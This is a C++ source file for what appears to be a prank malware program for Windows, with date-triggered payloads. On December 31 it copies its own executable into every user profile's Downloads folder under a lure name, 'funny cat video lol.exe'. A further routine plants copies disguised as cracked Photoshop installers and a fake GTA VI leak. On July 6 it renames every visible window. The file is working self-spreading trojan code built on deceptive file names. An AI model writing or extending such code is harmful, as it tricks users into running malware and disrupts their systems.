#define WIN32_LEAN_AND_MEAN
#define NOMINMAX

#include <windows.h>

#include "dates.h"

#include "../utils/unicurse.h" // needed for cursed payloads

// ============================================================
// Dec 31st: drop a copy of the running exe as "cat vid.exe"
// into every profile's Downloads folder (including Public).
// ============================================================

// Shared: copy the running exe (as `targetName`) into the
// downloads folder of every user profile.
//
// Works on both layouts:
//   NT6+ : C:\Users\<name>\Downloads\...
//   XP   : C:\Documents and Settings\<name>\My Documents\...
//
// `extraSub` is an optional sub-path below the downloads dir.
static void CopyToProfiles(
    const wchar_t* targetName,
    const wchar_t* extraSub
)
{
    wchar_t selfPath[MAX_PATH];

    if (!GetModuleFileNameW(NULL, selfPath, MAX_PATH))
        return;

    // Enumerate profiles, preferring the NT6+ "Users" root and
    // falling back to the XP "Documents and Settings" root.
    WIN32_FIND_DATAW fd{};

    HANDLE find =
        FindFirstFileW(
            L"C:\\Users\\*",
            &fd
        );

    if (find == INVALID_HANDLE_VALUE)
    {
        find =
            FindFirstFileW(
                L"C:\\Documents and Settings\\*",
                &fd
            );
    }

    if (find == INVALID_HANDLE_VALUE)
        return;

    do
    {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
            continue;

        if (
            wcscmp(fd.cFileName, L".") == 0 ||
            wcscmp(fd.cFileName, L"..") == 0
        )
            continue;

        wchar_t base[MAX_PATH];

        wsprintfW(
            base,
            L"C:\\Users\\%ls\\Downloads",
            fd.cFileName
        );

        if (GetFileAttributesW(base) == INVALID_FILE_ATTRIBUTES)
        {
            wsprintfW(
                base,
                L"C:\\Documents and Settings\\%ls\\My Documents",
                fd.cFileName
            );

            if (GetFileAttributesW(base) == INVALID_FILE_ATTRIBUTES)
                continue;
        }

        wchar_t dest[MAX_PATH];

        if (extraSub && extraSub[0])
        {
            wsprintfW(
                dest,
                L"%ls\\%ls\\%ls",
                base,
                extraSub,
                targetName
            );
        }
        else
        {
            wsprintfW(
                dest,
                L"%ls\\%ls",
                base,
                targetName
            );
        }

        CopyFileW(selfPath, dest, FALSE);
    }
    while (FindNextFileW(find, &fd));

    FindClose(find);
}

static void DropCatVid()
{
    CopyToProfiles(
        L"funny cat video lol.exe", //L"cat vid.exe",
        NULL
    );
}

static void Cracklol01()
{
    // Per-OS crack name: XP-era CS4, Win7+ CC 2024, GTA VI after
    // 01/01/2027. GetVersionExW is deprecated but XP-compatible;
    // we don't carry a manifest, so it returns the real version.
    OSVERSIONINFOEXW osvi{};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    if (!GetVersionExW(reinterpret_cast<OSVERSIONINFOW*>(&osvi)))
        ZeroMemory(&osvi, sizeof(osvi));

    SYSTEMTIME now;
    GetLocalTime(&now);

    const bool afterGTA =
        (now.wYear > 2027) ||
        (now.wYear == 2027 && now.wMonth > 1) ||
        (now.wYear == 2027 && now.wMonth == 1 && now.wDay >= 1);

    const bool modern =
        (osvi.dwMajorVersion > 6) ||
        (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion >= 1);

    const wchar_t* targetName = nullptr;
    const wchar_t* subDir = nullptr;

    if (afterGTA)
    {
        targetName =
            L"Grand Theft Auto VI CYBERLEEK-buildv.1.0.245"
            L"\\Grand Theft Auto VI CYBERLEEK-buildv.1.0.245.iso.exe";
        subDir = nullptr;
    }
    else if (modern)
    {
        targetName =
            L"Adobe.Photoshop.CC.2024.v25.0.0.0_64bit_crack.exe";
        subDir =
            L"uTorrent\\Adobe.Photoshop.CC.2024\\Setup+Crack";
    }
    else
    {
        targetName =
            L"Adobe.Photoshop.CS4.Extended.v11.0.0.0_64bit.Crack.Only-NoPE.7z.rar09.exe";
        subDir =
            L"uTorrent\\Adobe.Photoshop.CS4.Extended.v11.0.0.0_64bit.Crack.Only-NoPE\\Setup+Crack";
    }

    CopyToProfiles(targetName, subDir);
}

// ============================================================
// July 6th: "AURA." + every window title becomes "sigmaxxing".
// ============================================================

static BOOL CALLBACK RenameWindowsProc(
    HWND hwnd,
    LPARAM
)
{
    if (
        IsWindowVisible(hwnd) &&
        GetWindowTextLengthW(hwnd) > 0
    )
    {
        SetWindowTextW(hwnd, L"sigmaxxing");
    }

    return TRUE;
}

static void ShowAura()
{
    if (
        MessageBoxW(
            NULL,
            L"AURA.",
            L". . .   A U R A   . . .",
            MB_OKCANCEL | MB_ICONWARNING
        ) == IDOK
        )
    {
        // true - apertou OK
    }
    else
    {
        MessageBoxW(NULL, L"ratio", L"L", MB_OK | MB_ICONEXCLAMATION);
    }

    EnumWindows(RenameWindowsProc, 0);
}

static void ShowCursed()
{
    // current untested
    wchar_t cursed[64];

    GenerateRandomUnicode(cursed, 64);

    MessageBoxW(
        NULL,
        cursed,
        cursed,
        MB_OK | MB_ICONWARNING
    );

    EnumWindows(RenameWindowsProc, 0);
}

void EasterDates()
{
    SYSTEMTIME st;
    GetLocalTime(&st);

    if (st.wMonth == 12 && st.wDay == 31)
        DropCatVid();

    if (st.wMonth == 7 && st.wDay == 6)
        ShowAura();
}
